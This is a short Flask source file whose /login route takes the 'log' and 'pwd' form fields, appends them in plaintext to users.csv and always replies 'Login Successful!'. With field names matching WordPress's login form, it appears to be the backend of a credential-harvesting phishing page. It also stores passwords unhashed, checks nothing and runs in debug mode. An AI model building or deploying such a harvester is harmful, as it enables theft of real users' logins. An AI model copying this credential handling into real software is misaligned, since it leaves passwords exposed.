from flask import Flask, render_template, request
import csv

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["log"]
    password = request.form["pwd"]

    with open("users.csv", "a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow([username, password])

    return "Login Successful!"

if __name__ == "__main__":
    app.run(debug=True)